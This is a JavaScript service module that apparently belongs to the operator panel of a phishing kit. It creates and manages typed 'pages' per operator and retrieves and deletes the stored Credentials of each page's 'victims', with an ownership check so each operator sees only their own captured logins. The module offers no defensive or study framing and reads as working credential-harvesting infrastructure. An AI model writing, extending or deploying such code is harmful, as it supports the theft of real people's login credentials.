import Page from "../model/pages.js";
import Credentials from "../model/credentials.js";

export const getPages = async (user_id, type = "all") => {
  if (type === "all") {
    const pages = await Page.find({
      author: user_id,
    });
    return pages;
  }

  const pages = await Page.find({
    author: user_id,
    type: type,
  });
  return pages;
};

export const createPage = async (user_id, type, title) => {
  await Page.create({
    author: user_id,
    type: type,
    title: title,
  });
};

export const checkPage = async (page_id, user_id) => {
  const page = await Page.findById(page_id);
  //page not found
  if (!page) {
    const err = new Error("page not found");
    err.name = "PageNotFoundError";
    throw err;
  }
  //user can only get victims of his own pages
  if (page?.author?.toString() !== user_id) {
    const err = new Error("forbidden");
    err.name = "ForbiddenError";
    throw err;
  }
  return page;
};

export const getVictims = async (page_id) => {
  const pageVictims = await Credentials.find({
    page: page_id,
  });
  return pageVictims;
};

export const deletePage = async (page_id, user_id) => {
  const page = await checkPage(page_id, user_id);
  await Credentials.deleteMany({ page: page_id });
  await page.deleteOne();
};

export const updatePage = async (page_id, user_id, title) => {
  const page = await checkPage(page_id, user_id);
  page.title = title;
  await page.save();
};
